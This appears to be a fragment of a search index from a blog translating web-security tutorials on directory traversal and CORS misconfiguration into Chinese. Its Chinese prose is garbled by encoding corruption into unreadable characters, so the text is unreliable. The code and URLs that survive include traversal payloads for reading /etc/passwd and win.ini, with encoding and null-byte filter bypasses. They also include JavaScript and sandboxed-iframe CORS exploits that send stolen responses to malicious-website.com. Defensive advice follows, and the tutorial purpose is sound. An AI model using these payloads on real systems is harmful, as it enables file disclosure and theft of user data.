æ­¤è¿™ä¸ªæ–‡ä»¶å…¶å®å°±æ˜¯ï¼š /etc/passwd åœ¨ Unix æ“ä½œç³»ç»Ÿä¸Šï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå†…å®¹ä¸ºè¯¥æœåŠ¡å™¨ä¸Šæ³¨å†Œç”¨æˆ·è¯¦ç»†ä¿¡æ¯çš„æ ‡å‡†æ–‡ä»¶ã€‚ åœ¨ Windows ç³»ç»Ÿä¸Šï¼Œ..\\ å’Œ ../ çš„ä½œç”¨ç›¸åŒï¼Œéƒ½è¡¨ç¤ºä¸Šçº§ç›®å½•ï¼Œå› æ­¤æ£€ç´¢æ ‡å‡†æ“ä½œç³»ç»Ÿæ–‡ä»¶å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ï¼š https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini ","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"åˆ©ç”¨æ–‡ä»¶è·¯å¾„éå†æ¼æ´çš„å¸¸è§éšœç¢ è®¸å¤šå°†ç”¨æˆ·è¾“å…¥æ”¾å…¥æ–‡ä»¶è·¯å¾„çš„åº”ç”¨ç¨‹åºå®ç°äº†æŸç§åº”å¯¹è·¯å¾„éå†æ”»å‡»çš„é˜²å¾¡æªæ–½ï¼Œç„¶è€Œè¿™äº›æªæ–½å´é€šå¸¸å¯ä»¥è¢«è§„é¿ã€‚ å¦‚æœåº”ç”¨ç¨‹åºä»ç”¨æˆ·è¾“å…¥çš„ filename ä¸­å‰¥ç¦»æˆ–é˜»æ­¢ ..\\ ç›®å½•éå†åºåˆ—ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ä½¿ç”¨å„ç§æŠ€å·§ç»•è¿‡é˜²å¾¡ã€‚ ä½ å¯ä»¥ä½¿ç”¨ä»ç³»ç»Ÿæ ¹ç›®å½•å¼€å§‹çš„ç»å¯¹è·¯å¾„ï¼Œä¾‹å¦‚ filename=/etc/passwd è¿™æ ·ç›´æ¥å¼•ç”¨æ–‡ä»¶è€Œä¸ä½¿ç”¨ä»»ä½• ..\\ å½¢å¼çš„éå†åºåˆ—ã€‚ ä½ ä¹Ÿå¯ä»¥åµŒå¥—çš„éå†åºåˆ—ï¼Œä¾‹å¦‚ ....// æˆ–è€… ....\\/ ï¼Œå³ä½¿å†…è”åºåˆ—è¢«å‰¥ç¦»ï¼Œå…¶ä¹Ÿå¯ä»¥æ¢å¤ä¸ºç®€å•çš„éå†åºåˆ—ã€‚ ä½ è¿˜å¯ä»¥ä½¿ç”¨å„ç§éæ ‡å‡†ç¼–ç ï¼Œä¾‹å¦‚ ..%c0%af æˆ–è€… ..%252f ä»¥ç»•è¿‡è¾“å…¥è¿‡æ»¤å™¨ã€‚ å¦‚æœåº”ç”¨ç¨‹åºè¦æ±‚ç”¨æˆ·æä¾›çš„æ–‡ä»¶åå¿…é¡»ä»¥æŒ‡å®šçš„æ–‡ä»¶å¤¹å¼€å¤´ï¼Œä¾‹å¦‚ /var/www/images ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åè·Ÿéå†åºåˆ—çš„æ–¹å¼ç»•è¿‡ï¼Œä¾‹å¦‚ï¼š filename=/var/www/images/../../../etc/passwd å¦‚æœåº”ç”¨ç¨‹åºè¦æ±‚ç”¨æˆ·æä¾›çš„æ–‡ä»¶åå¿…é¡»ä»¥æŒ‡å®šçš„åç¼€ç»“å°¾ï¼Œä¾‹å¦‚ .png ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ç©ºå­—èŠ‚åœ¨æ‰€éœ€æ‰©å±•åä¹‹å‰æœ‰æ•ˆåœ°ç»ˆæ­¢æ–‡ä»¶è·¯å¾„å¹¶ç»•è¿‡æ£€æŸ¥ï¼š filename=../../../etc/passwd%00.png ","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ç›®å½•éå†æ”»å‡» é˜²å¾¡æ–‡ä»¶è·¯å¾„éå†æ¼æ´æœ€æœ‰æ•ˆçš„æ–¹å¼æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ç›´æ¥å®Œæ•´åœ°ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ API ã€‚è®¸å¤šå®ç°æ­¤åŠŸèƒ½çš„åº”ç”¨ç¨‹åºéƒ¨åˆ†å¯ä»¥é‡å†™ï¼Œä»¥æ›´å®‰å…¨çš„æ–¹å¼æä¾›ç›¸åŒçš„è¡Œä¸ºã€‚ å¦‚æœè®¤ä¸ºå°†ç”¨æˆ·è¾“å…¥ä¼ é€’åˆ°æ–‡ä»¶ç³»ç»Ÿ API æ˜¯ä¸å¯é¿å…çš„ï¼Œåˆ™åº”è¯¥åŒæ—¶ä½¿ç”¨ä»¥ä¸‹ä¸¤å±‚é˜²å¾¡æªæ–½ï¼š åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œé€šè¿‡ç™½åå•çš„å½¢å¼åªå…è®¸æ˜ç¡®çš„æŒ‡å®šå€¼ã€‚å¦‚æœæ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆåº”è¯¥éªŒè¯è¾“å…¥æ˜¯å¦åªåŒ…å«å…è®¸çš„å†…å®¹ï¼Œä¾‹å¦‚çº¯å­—æ¯æ•°å­—å­—ç¬¦ã€‚ éªŒè¯ç”¨æˆ·è¾“å…¥åï¼Œåº”ç”¨ç¨‹åºåº”è¯¥å°†è¾“å…¥é™„åŠ åˆ°åŸºå‡†ç›®å½•ä¸‹ï¼Œå¹¶ä½¿ç”¨å¹³å°æ–‡ä»¶ç³»ç»Ÿ API è§„èŒƒåŒ–è·¯å¾„ï¼Œç„¶åéªŒè¯è§„èŒƒåŒ–åçš„è·¯å¾„æ˜¯å¦ä»¥åŸºå‡†ç›®å½•å¼€å¤´ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ Java ä»£ç ç¤ºä¾‹ï¼ŒåŸºäºç”¨æˆ·è¾“å…¥éªŒè¯è§„èŒƒåŒ–è·¯å¾„ï¼š File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file } ","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ CORS","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"Cross-origin resource sharing (CORS) åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰ï¼Œå¹¶æè¿°ä¸€äº›åŸºäº CORS çš„å¸¸è§æ”»å‡»ç¤ºä¾‹ï¼Œä»¥åŠè®¨è®ºå¦‚ä½•é˜²å¾¡è¿™äº›æ”»å‡»ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ç§æµè§ˆå™¨æœºåˆ¶ï¼Œå®ƒå…è®¸å¯¹ä½äºå½“å‰è®¿é—®åŸŸä¹‹å¤–çš„èµ„æºè¿›è¡Œå—æ§è®¿é—®ã€‚å®ƒæ‰©å±•å¹¶å¢åŠ äº†åŒæºç­–ç•¥çš„çµæ´»æ€§ã€‚ç„¶è€Œï¼Œå¦‚æœä¸€ä¸ªç½‘ç«™çš„ CORS ç­–ç•¥é…ç½®å’Œå®ç°ä¸å½“ï¼Œå®ƒä¹Ÿå¯èƒ½å¯¼è‡´åŸºäºè·¨åŸŸçš„æ”»å‡»ã€‚CORS ä¸æ˜¯é’ˆå¯¹è·¨æºæ”»å‡»ï¼ˆä¾‹å¦‚è·¨ç«™è¯·æ±‚ä¼ªé€  CSRFï¼‰çš„ä¿æŠ¤ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"Same-origin policyï¼ˆåŒæºç­–ç•¥ï¼‰ åŒæºç­–ç•¥æ˜¯ä¸€ç§é™åˆ¶æ€§çš„è·¨åŸŸè§„èŒƒï¼Œå®ƒé™åˆ¶äº†ç½‘ç«™ä¸æºåŸŸä¹‹å¤–èµ„æºäº¤äº’çš„èƒ½åŠ›ã€‚åŒæºç­–ç•¥æ˜¯å¤šå¹´å‰å®šä¹‰çš„ï¼Œç”¨äºåº”å¯¹æ½œåœ¨çš„æ¶æ„è·¨åŸŸäº¤äº’ï¼Œä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ä»å¦ä¸€ä¸ªç½‘ç«™çªƒå–ç§äººæ•°æ®ã€‚å®ƒé€šå¸¸å…è®¸åŸŸå‘å…¶ä»–åŸŸå‘å‡ºè¯·æ±‚ï¼Œä½†ä¸å…è®¸è®¿é—®å“åº”ã€‚ æ›´å¤šå†…å®¹è¯·å‚è€ƒ Same-origin-policy ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"åŒæºç­–ç•¥çš„æ”¾å®½ åŒæºç­–ç•¥å…·æœ‰å¾ˆå¤§çš„é™åˆ¶æ€§ï¼Œå› æ­¤äººä»¬è®¾è®¡äº†å¾ˆå¤šæ–¹æ³•å»è§„é¿è¿™äº›é™åˆ¶ã€‚è®¸å¤šç½‘ç«™ä¸å­åŸŸæˆ–ç¬¬ä¸‰æ–¹ç½‘ç«™çš„äº¤äº’æ–¹å¼è¦æ±‚å®Œå…¨çš„è·¨åŸŸè®¿é—®ã€‚ä½¿ç”¨è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰å¯ä»¥æœ‰æ§åˆ¶åœ°æ”¾å®½åŒæºç­–ç•¥ã€‚ CORS åè®®ä½¿ç”¨ä¸€ç»„ HTTP header æ¥å®šä¹‰å¯ä¿¡çš„ web åŸŸå’Œç›¸å…³å±æ€§ï¼Œä¾‹å¦‚æ˜¯å¦å…è®¸é€šè¿‡èº«ä»½éªŒè¯çš„è®¿é—®ã€‚æµè§ˆå™¨å’Œå®ƒè¯•å›¾è®¿é—®çš„è·¨åŸŸç½‘ç«™ä¹‹é—´è¿›è¡Œè¿™äº› header çš„äº¤æ¢ã€‚ æ›´å¤šå†…å®¹è¯·å‚è€ƒ CORS and the Access-Control-Allow-Origin response header ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"CORS é…ç½®ä¸å½“å¼•å‘çš„æ¼æ´ ç°åœ¨è®¸å¤šç½‘ç«™ä½¿ç”¨ CORS æ¥å…è®¸æ¥è‡ªå­åŸŸå’Œå¯ä¿¡çš„ç¬¬ä¸‰æ–¹çš„è®¿é—®ã€‚ä»–ä»¬å¯¹ CORS çš„å®ç°å¯èƒ½åŒ…å«æœ‰é”™è¯¯æˆ–è¿‡äºæ”¾å®½ï¼Œè¿™å¯èƒ½å¯¼è‡´å¯åˆ©ç”¨çš„æ¼æ´ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"æœåŠ¡ç«¯ ACAO ç›´æ¥è¿”å›å®¢æˆ·ç«¯çš„ Origin æœ‰äº›åº”ç”¨ç¨‹åºéœ€è¦å…è®¸å¾ˆå¤šå…¶å®ƒåŸŸçš„è®¿é—®ã€‚ç»´æŠ¤ä¸€ä¸ªå…è®¸åŸŸçš„åˆ—è¡¨éœ€è¦ä»˜å‡ºæŒç»­çš„åŠªåŠ›ï¼Œä»»ä½•å·®é”™éƒ½æœ‰å¯èƒ½é€ æˆç ´åã€‚å› æ­¤ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨ä¸€äº›æ›´åŠ ç®€å•çš„æ–¹æ³•æ¥è¾¾åˆ°æœ€ç»ˆç›®çš„ã€‚ ä¸€ç§æ–¹æ³•æ˜¯ä»è¯·æ±‚å¤´ä¸­è¯»å– Originï¼Œç„¶åå°†å…¶ä½œä¸º Access-Control-Allow-Origin å“åº”å¤´è¿”å›ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºæ¥å—äº†ä»¥ä¸‹è¯·æ±‚ï¼š GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=... ç„¶åï¼Œå…¶å“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true å“åº”å¤´è¡¨æ˜å…è®¸ä»è¯·æ±‚åŸŸè¿›è¡Œè®¿é—®ï¼Œå¹¶ä¸”è·¨åŸŸè¯·æ±‚å¯ä»¥åŒ…æ‹¬ cookiesï¼ˆAccess-Control-Allow-Credentials: trueï¼‰ï¼Œå› æ­¤æµè§ˆå™¨å°†ä¼šåœ¨ä¼šè¯ä¸­è¿›è¡Œå¤„ç†ã€‚ ç”±äºåº”ç”¨ç¨‹åºåœ¨ Access-Control-Allow-Origin å¤´ä¸­ç›´æ¥è¿”å›äº†è¯·æ±‚åŸŸï¼Œè¿™æ„å‘³ç€ä»»ä½•åŸŸéƒ½å¯ä»¥è®¿é—®èµ„æºã€‚å¦‚æœå“åº”ä¸­åŒ…å«äº†ä»»ä½•æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ API key æˆ–è€… CSRF token åˆ™éƒ½å¯ä»¥è¢«è·å–ï¼Œä½ å¯ä»¥åœ¨ä½ çš„ç½‘ç«™ä¸Šæ”¾ç½®ä»¥ä¸‹è„šæœ¬è¿›è¡Œæ£€ç´¢ï¼š var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; }; ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:1","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"Origin å¤„ç†æ¼æ´ æŸäº›åº”ç”¨ç¨‹åºä½¿ç”¨ç™½åå•æœºåˆ¶æ¥å®ç°å¯ä¿¡æ¥æºçš„è®¿é—®å…è®¸ã€‚å½“æ”¶åˆ° CORS è¯·æ±‚æ—¶ï¼Œå°†è¯·æ±‚å¤´ä¸­çš„ origin ä¸ç™½åå•è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœåœ¨ç™½åå•ä¸­ï¼Œåˆ™åœ¨ Access-Control-Allow-Origin å¤´ä¸­è¿”å›è¯·æ±‚çš„ origin ä»¥å…è®¸å…¶è·¨åŸŸè®¿é—®ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºæ”¶åˆ°äº†å¦‚ä¸‹çš„è¯·æ±‚ï¼š GET /data HTTP/1.1 Host: normal-website.com ... Origin: https://innocent-website.com åº”ç”¨ç¨‹åºæ£€æŸ¥ç™½åå•åˆ—è¡¨ï¼Œå¦‚æœ origin åœ¨è¡¨ä¸­ï¼Œåˆ™å“åº”ï¼š HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://innocent-website.com åœ¨å®ç° CORS origin ç™½åå•æ—¶å¾ˆå¯èƒ½ä¼šçŠ¯ä¸€äº›å¤±è¯¯ã€‚æŸä¸ªç»„ç»‡å†³å®šå…è®¸ä»å…¶æ‰€æœ‰å­åŸŸï¼ˆåŒ…æ‹¬å°šæœªå­˜åœ¨çš„æœªæ¥å­åŸŸï¼‰è¿›è¡Œè®¿é—®ã€‚åº”ç”¨ç¨‹åºå…è®¸ä»å…¶ä»–ç»„ç»‡çš„åŸŸï¼ˆåŒ…æ‹¬å…¶å­åŸŸï¼‰è¿›è¡Œè®¿é—®ã€‚è¿™äº›è§„åˆ™é€šå¸¸é€šè¿‡åŒ¹é… URL å‰ç¼€æˆ–åç¼€ï¼Œæˆ–ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥å®ç°ã€‚å®ç°ä¸­çš„ä»»ä½•å¤±è¯¯éƒ½å¯èƒ½å¯¼è‡´è®¿é—®æƒé™è¢«æˆäºˆæ„å¤–çš„å¤–éƒ¨åŸŸã€‚ ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºå…è®¸ä»¥ä¸‹ç»“å°¾çš„æ‰€æœ‰åŸŸçš„è®¿é—®æƒé™ï¼š normal-website.com æ”»å‡»è€…åˆ™å¯ä»¥é€šè¿‡æ³¨å†Œä»¥ä¸‹åŸŸæ¥è·å¾—è®¿é—®æƒé™ï¼ˆç»“å°¾åŒ¹é…ï¼‰ï¼š hackersnormal-website.com æˆ–è€…åº”ç”¨ç¨‹åºå…è®¸ä»¥ä¸‹å¼€å¤´çš„æ‰€æœ‰åŸŸçš„è®¿é—®æƒé™ï¼š normal-website.com æ”»å‡»è€…åˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åŸŸè·å¾—è®¿é—®æƒé™ï¼ˆå¼€å¤´åŒ¹é…ï¼‰ï¼š normal-website.com.evil-user.net ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:2","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"Origin ç™½åå•å…è®¸ null å€¼ æµè§ˆå™¨ä¼šåœ¨ä»¥ä¸‹æƒ…å†µä¸‹å‘é€å€¼ä¸º null çš„ Origin å¤´ï¼š è·¨ç«™ç‚¹é‡å®šå‘ æ¥è‡ªåºåˆ—åŒ–æ•°æ®çš„è¯·æ±‚ ä½¿ç”¨ file: åè®®çš„è¯·æ±‚ æ²™ç›’ä¸­çš„è·¨åŸŸè¯·æ±‚ æŸäº›åº”ç”¨ç¨‹åºå¯èƒ½ä¼šåœ¨ç™½åå•ä¸­å…è®¸ null ä»¥æ–¹ä¾¿æœ¬åœ°å¼€å‘ã€‚ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºæ”¶åˆ°äº†ä»¥ä¸‹è·¨åŸŸè¯·æ±‚ï¼š GET /sensitive-victim-data Host: vulnerable-website.com Origin: null æœåŠ¡å™¨å“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å„ç§æŠ€å·§ç”Ÿæˆ Origin ä¸º null çš„è¯·æ±‚ä»¥é€šè¿‡ç™½åå•ï¼Œä»è€Œè·å¾—è®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ iframe æ²™ç›’è¿›è¡Œè·¨åŸŸè¯·æ±‚ï¼š \u003ciframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,\u003cscript\u003e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; \u003c/script\u003e\"\u003e\u003c/iframe\u003e ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:3","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"é€šè¿‡ CORS ä¿¡ä»»å…³ç³»åˆ©ç”¨ XSS CORS ä¼šåœ¨ä¸¤ä¸ªåŸŸä¹‹é—´å»ºç«‹ä¿¡ä»»å…³ç³»ï¼Œå³ä½¿ CORS æ˜¯æ­£ç¡®çš„é…ç½®ï¼Œä½†æ˜¯å¦‚æœæŸä¸ªå—ä¿¡ä»»çš„ç½‘ç«™å­˜åœ¨ XSS æ¼æ´ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨ XSS æ¼æ´æ³¨å…¥è„šæœ¬ï¼Œè¿›è€Œä»å—ä¿¡ä»»çš„ç½‘ç«™ä¸Šè·å–æ•æ„Ÿä¿¡æ¯ã€‚ å‡è®¾è¯·æ±‚ä¸ºï¼š GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=... å¦‚æœæœåŠ¡å™¨å“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true é‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡ subdomain.vulnerable-website.com ç½‘ç«™ä¸Šçš„ XSS æ¼æ´å»è·å–ä¸€äº›æ•æ„Ÿæ•°æ®ï¼š https://subdomain.vulnerable-website.com/?xss=\u003cscript\u003ecors-stuff-here\u003c/script\u003e ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:4","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"ä½¿ç”¨é…ç½®æœ‰é—®é¢˜çš„ CORS ä¸­æ–­ TLS å‡è®¾ä¸€ä¸ªä¸¥æ ¼ä½¿ç”¨ HTTPS çš„åº”ç”¨ç¨‹åºä¹Ÿé€šè¿‡ç™½åå•ä¿¡ä»»äº†ä¸€ä¸ªä½¿ç”¨ HTTP çš„å­åŸŸã€‚ä¾‹å¦‚ï¼Œå½“åº”ç”¨ç¨‹åºæ”¶åˆ°ä»¥ä¸‹è¯·æ±‚æ—¶ï¼š GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: http://trusted-subdomain.vulnerable-website.com Cookie: sessionid=... åº”ç”¨ç¨‹åºå“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿæ‹¦æˆªå—å®³è€…ç”¨æˆ·æµé‡çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ CORS æ¥ç ´åå—å®³è€…ä¸åº”ç”¨ç¨‹åºçš„æ­£å¸¸äº¤äº’ã€‚æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š å—å®³è€…ç”¨æˆ·å‘å‡ºä»»ä½•çº¯ HTTP è¯·æ±‚ã€‚ æ”»å‡»è€…å°†é‡å®šå‘æ³¨å…¥åˆ°ï¼šhttp://trusted-subdomain.vulnerable-website.com å—å®³è€…çš„æµè§ˆå™¨éµå¾ªé‡å®šå‘ã€‚ æ”»å‡»è€…æˆªè·çº¯ HTTP è¯·æ±‚ï¼Œè¿”å›ä¼ªé€ çš„å“åº”ç»™å—å®³è€…ï¼Œå¹¶å‘å‡ºæ¶æ„çš„ CORS è¯·æ±‚ç»™ï¼šhttps://vulnerable-website.com å—å®³è€…çš„æµè§ˆå™¨å‘å‡º CORS è¯·æ±‚ï¼Œorigin ä¸ºï¼šhttp://trusted-subdomain.vulnerable-website.com åº”ç”¨ç¨‹åºå…è®¸è¯·æ±‚ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªç™½åå•åŸŸï¼Œè¯·æ±‚çš„æ•æ„Ÿæ•°æ®åœ¨å“åº”ä¸­è¿”å›ã€‚ æ”»å‡»è€…çš„æ¬ºéª—é¡µé¢å¯ä»¥è¯»å–æ•æ„Ÿæ•°æ®å¹¶å°†å…¶ä¼ è¾“åˆ°æ”»å‡»è€…æ§åˆ¶ä¸‹çš„ä»»ä½•åŸŸã€‚ å³ä½¿æ˜“å—æ”»å‡»çš„ç½‘ç«™å¯¹ HTTPS çš„ä½¿ç”¨æ²¡æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰ HTTP ç«¯ç‚¹ï¼ŒåŒæ—¶æ‰€æœ‰ Cookie éƒ½æ ‡è®°ä¸ºå®‰å…¨ï¼Œæ­¤æ”»å‡»ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:5","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"å†…ç½‘å’Œæ— å‡­è¯çš„ CORS å¤§éƒ¨åˆ† CORS æ”»å‡»éƒ½éœ€è¦ä»¥ä¸‹å“åº”å¤´çš„å­˜åœ¨ï¼š Access-Control-Allow-Credentials: true æ²¡æœ‰è¿™ä¸ªå“åº”å¤´ï¼Œå—å®³è€…çš„æµè§ˆå™¨å°†ä¸ä¼šå‘é€ cookies ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…åªèƒ½è®¿é—®æ— éœ€ç”¨æˆ·éªŒè¯çš„å†…å®¹ï¼Œè€Œè¿™äº›å†…å®¹ç›´æ¥è®¿é—®ç›®æ ‡ç½‘ç«™å°±å¯ä»¥è½»æ¾è·å¾—ã€‚ ç„¶è€Œï¼Œæœ‰ä¸€ç§æƒ…å†µä¸‹æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ç½‘ç«™ï¼šç½‘ç«™æ˜¯å†…ç½‘ï¼Œå¹¶ä¸”æ˜¯ç§æœ‰ IP åœ°å€ç©ºé—´ã€‚å†…ç½‘çš„å®‰å…¨æ ‡å‡†é€šå¸¸ä½äºå¤–ç½‘ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å‘ç°æ¼æ´åå¯ä»¥è·å¾—è¿›ä¸€æ­¥çš„è®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªç§æœ‰ç½‘ç»œä¸­çš„è·¨åŸŸè¯·æ±‚ï¼š GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com æœåŠ¡å™¨å“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: * æœåŠ¡å™¨ä¿¡ä»»æ‰€æœ‰æ¥æºçš„è·¨åŸŸè¯·æ±‚ï¼Œè€Œä¸”æ— éœ€å‡­è¯ã€‚å¦‚æœç§æœ‰IPåœ°å€ç©ºé—´å†…çš„ç”¨æˆ·è®¿é—®å…¬å…±äº’è”ç½‘ï¼Œåˆ™å¯ä»¥ä»å¤–éƒ¨ç«™ç‚¹æ‰§è¡ŒåŸºäº CORS çš„æ”»å‡»ï¼Œè¯¥ç«™ç‚¹ä½¿ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºè®¿é—®å†…ç½‘èµ„æºçš„ä»£ç†ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:4:6","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²æŠ¤åŸºäº CORS çš„æ”»å‡» CORS æ¼æ´ä¸»è¦æ˜¯ç”±äºé”™è¯¯çš„é…ç½®è€Œäº§ç”Ÿçš„ï¼Œå› æ­¤é˜²æŠ¤æªæ–½ä¸»è¦ä¹Ÿæ˜¯å¦‚ä½•è¿›è¡Œæ­£ç¡®é…ç½®çš„é—®é¢˜ã€‚ä¸‹é¢å°†ä¼šæè¿°ä¸€äº›æœ‰æ•ˆçš„æ–¹æ³•ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"è·¨åŸŸè¯·æ±‚çš„æ­£ç¡®é…ç½® å¦‚æœ web èµ„æºåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œé‚£ä¹ˆåº”è¯¥åœ¨ Access-Control-Allow-Origin å¤´ä¸­å£°æ˜å…è®¸çš„æ¥æºã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:1","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"åªå…è®¸å—ä¿¡ä»»çš„ç«™ç‚¹ Access-Control-Allow-Origin å¤´åªèƒ½æ˜¯å—ä¿¡ä»»çš„ç«™ç‚¹ã€‚Access-Control-Allow-Origin ç›´æ¥ä½¿ç”¨è·¨åŸŸè¯·æ±‚çš„ origin è€Œä¸éªŒè¯æ˜¯å¾ˆå®¹æ˜“è¢«åˆ©ç”¨çš„ï¼Œåº”è¯¥é¿å…ã€‚ 